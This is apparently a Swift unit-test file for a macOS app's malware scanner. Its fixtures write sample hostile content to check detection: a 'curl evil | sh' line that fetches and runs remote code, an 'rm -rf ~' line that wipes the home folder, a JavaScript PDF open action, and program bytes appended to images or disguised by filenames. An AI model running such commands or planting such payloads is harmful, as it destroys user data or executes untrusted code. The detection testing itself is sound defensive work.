// SPDX-License-Identifier: GPL-3.0-or-later

import Darwin
import Foundation
import Testing
@testable import SpaceroomCore

@Suite("Protection")
struct ProtectionTests {
    let machO: [UInt8] = [0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01] + Array(repeating: 0, count: 120)
    let scanner = ProtectionScanner()

    @discardableResult
    func write(_ box: Sandbox, _ relative: String, _ bytes: [UInt8]) throws -> URL {
        let url = box.home.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(bytes).write(to: url)
        return url
    }

    func markDownloaded(_ url: URL) {
        let value = "0083;00000000;Safari;"
        _ = value.withCString { setxattr(url.path, "com.apple.quarantine", $0, strlen($0), 0, XATTR_NOFOLLOW) }
    }

    func kinds(_ box: Sandbox) -> [String: ThreatKind] {
        let report = scanner.scan([box.home.appendingPathComponent("Downloads")])
        return Dictionary(report.findings.map { ($0.url.lastPathComponent, $0.kind) }, uniquingKeysWith: { a, _ in a })
    }

    let jpeg: [UInt8] = [0xFF, 0xD8, 0xFF, 0xE0] + Array(repeating: 0x11, count: 2_000) + [0xFF, 0xD9]
    let png: [UInt8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A] + Array(repeating: 0x22, count: 500)
        + Array("IEND".utf8) + [0xAE, 0x42, 0x60, 0x82]

    @Test func findsProgramsPosingAsPhotosAndDocuments() throws {
        let box = try Sandbox()
        try write(box, "Downloads/holiday.jpg", machO)
        try write(box, "Downloads/contract.pdf", Array("#!/bin/sh\ncurl evil | sh\n".utf8))
        try write(box, "Downloads/real.jpg", jpeg)
        let found = kinds(box)
        #expect(found["holiday.jpg"] == .disguisedProgram)
        #expect(found["contract.pdf"] == .disguisedProgram)
        #expect(found["real.jpg"] == nil)
    }

    @Test func plainTextScriptsOnlyMatterWhenExecutable() throws {
        let box = try Sandbox()
        let notes = try write(box, "Downloads/notes.txt", Array("#!/bin/sh\necho hi\n".utf8))
        #expect(kinds(box)["notes.txt"] == nil)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: notes.path)
        #expect(kinds(box)["notes.txt"] == .disguisedProgram)
    }

    @Test func spotsDeceptiveNames() {
        #expect(ProtectionScanner.deceptiveName("invoice.pdf.app") != nil)
        #expect(ProtectionScanner.deceptiveName("photo.JPG.command") != nil)
        #expect(ProtectionScanner.deceptiveName("report.pdf      .app") != nil)
        #expect(ProtectionScanner.deceptiveName("Invoice\u{202E}fdp.app") != nil)
        #expect(ProtectionScanner.deceptiveName("Archive.tar.gz") == nil)
        #expect(ProtectionScanner.deceptiveName("Visual Studio Code.app") == nil)
        #expect(ProtectionScanner.deceptiveName("v1.2.pkg") == nil)
    }

    @Test func findsCodeHiddenAfterAnImage() throws {
        let box = try Sandbox()
        try write(box, "Downloads/cat.jpg", jpeg + machO)
        try write(box, "Downloads/logo.png", png + Array("#!/bin/bash\nrm -rf ~\n".utf8))
        try write(box, "Downloads/polyglot.png", png + [0x50, 0x4B, 0x05, 0x06] + Array(repeating: 0, count: 18))
        try write(box, "Downloads/motion.jpg", jpeg + [0x00, 0x00, 0x00, 0x18] + Array("ftypmp42".utf8)) // phone motion photo
        let found = kinds(box)
        #expect(found["cat.jpg"] == .hiddenPayload)
        #expect(found["logo.png"] == .hiddenPayload)
        #expect(found["polyglot.png"] == .hiddenPayload)
        #expect(found["motion.jpg"] == nil)
    }

    @Test func flagsPDFsThatRunCode() throws {
        let box = try Sandbox()
        try write(box, "Downloads/form.pdf", Array("%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >>\n".utf8))
        try write(box, "Downloads/plain.pdf", Array("%PDF-1.7\n1 0 obj << /Type /Catalog >>\n".utf8))
        let report = scanner.scan([box.home.appendingPathComponent("Downloads")])
        let form = try #require(report.findings.first { $0.url.lastPathComponent == "form.pdf" })
        #expect(form.kind == .activePDF)
        #expect(form.evidence.contains("runs when it opens"))
        #expect(!report.findings.contains { $0.url.lastPathComponent == "plain.pdf" })
    }

    @Test func hiddenProgramsAndDownloadedScripts() throws {
        let box = try Sandbox()
        try write(box, "Downloads/.helper", machO)
        let script = try write(box, "Downloads/Install Flash.command", Array("#!/bin/sh\n".utf8))
        try write(box, "Downloads/my-own.command", Array("#!/bin/sh\n".utf8))
        markDownloaded(script)
        let found = kinds(box)
        #expect(found[".helper"] == .hiddenProgram)
        #expect(found["Install Flash.command"] == .downloadedScript)
        #expect(found["my-own.command"] == nil) // made on this Mac
    }

    @Test func unsignedAppsInPersonalFolders() throws {
        let box = try Sandbox()
        try write(box, "Downloads/Free Movies.app/Contents/MacOS/Free Movies", machO)
        let finding = try #require(scanner.scan([box.home.appendingPathComponent("Downloads")]).findings
            .first { $0.kind == .unsignedApp })
        #expect(finding.isDirectory)
        #expect(finding.severity == .medium) // no download flag: macOS never checked it
        #expect(finding.evidence.contains("download flag"))
    }

    @Test func skipsToolFoldersAndRespectsTheFileLimit() throws {
        let box = try Sandbox()
        try write(box, "Downloads/project/node_modules/pkg/evil.jpg", machO)
        #expect(kinds(box).isEmpty)
        for index in 0..<20 { try write(box, "Downloads/many/\(index).txt", [0x41]) }
        var limited = ProtectionScanner()
        limited.maxFiles = 5
        #expect(limited.scan([box.home.appendingPathComponent("Downloads")]).wasTruncated)
    }

    @Test func reportsLockedFolders() throws {
        let box = try Sandbox()
        let locked = box.home.appendingPathComponent("Downloads")
        try write(box, "Downloads/a.txt", [0x41])
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: locked.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path) }
        #expect(scanner.scan([locked]).lockedRoots == [locked])
    }

    @Test func movesFindingsToTheRestoreCenterAndNeverOutsidePersonalFolders() async throws {
        let box = try Sandbox()
        let photo = try write(box, "Downloads/holiday.jpg", machO)
        try write(box, "Downloads/Free Movies.app/Contents/MacOS/Free Movies", machO)
        try write(box, "Library/Preferences/fake.jpg", machO)
        var findings = scanner.scan([box.home.appendingPathComponent("Downloads")]).findings
        findings.append(ThreatFinding(url: box.home.appendingPathComponent("Library/Preferences/fake.jpg"),
                                      kind: .disguisedProgram, severity: .high, evidence: "test", size: 128))
        let store = try box.store()
        let outcome = try await ThreatRemover(store: store, home: box.home).remove(findings)
        let operation = try #require(outcome.operation)
        #expect(operation.module == "protection")
        #expect(!FileManager.default.fileExists(atPath: photo.path))
        #expect(!box.exists("Downloads/Free Movies.app"))
        #expect(box.exists("Library/Preferences/fake.jpg"))
        #expect(outcome.skipped.map(\.reason) == [.protectedPath])
        _ = try await store.restoreAll(in: operation.id)
        #expect(FileManager.default.fileExists(atPath: photo.path))
    }
}

@Suite("Protection: payloads after images")
struct HiddenPayloadTests {
    /// A real JPEG from ImageIO, so its structure is genuine.
    private func jpeg(at url: URL) throws {
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try SimilarPhotosTests.writePhoto(to: url, scene: 0, width: 400, height: 300)
    }

    @Test("A large program appended to a JPEG is found even though it contains FF D9 itself")
    func largePayloadInJPEG() throws {
        let box = try Sandbox()
        let url = box.home.appendingPathComponent("Downloads/cat.jpg")
        try jpeg(at: url)
        var payload = Data([0xCF, 0xFA, 0xED, 0xFE]) + Data(repeating: 0x11, count: 300_000)
        payload.append(contentsOf: [0xFF, 0xD9])   // an end marker inside the program
        payload.append(Data(repeating: 0x22, count: 1_000))
        let handle = try FileHandle(forWritingTo: url)
        try handle.seekToEnd()
        try handle.write(contentsOf: payload)
        try handle.close()
        let size = Int64((try FileManager.default.attributesOfItem(atPath: url.path)[.size] as? Int) ?? 0)
        #expect(ProtectionScanner.hiddenPayload(url, type: .jpeg, size: size) == .machO)
    }

    @Test("A clean JPEG has nothing after its end")
    func cleanJPEG() throws {
        let box = try Sandbox()
        let url = box.home.appendingPathComponent("Downloads/clean.jpg")
        try jpeg(at: url)
        let size = Int64((try FileManager.default.attributesOfItem(atPath: url.path)[.size] as? Int) ?? 0)
        #expect(ProtectionScanner.imageEnd(url, type: .jpeg, size: size) == size)
        #expect(ProtectionScanner.hiddenPayload(url, type: .jpeg, size: size) == nil)
    }
}
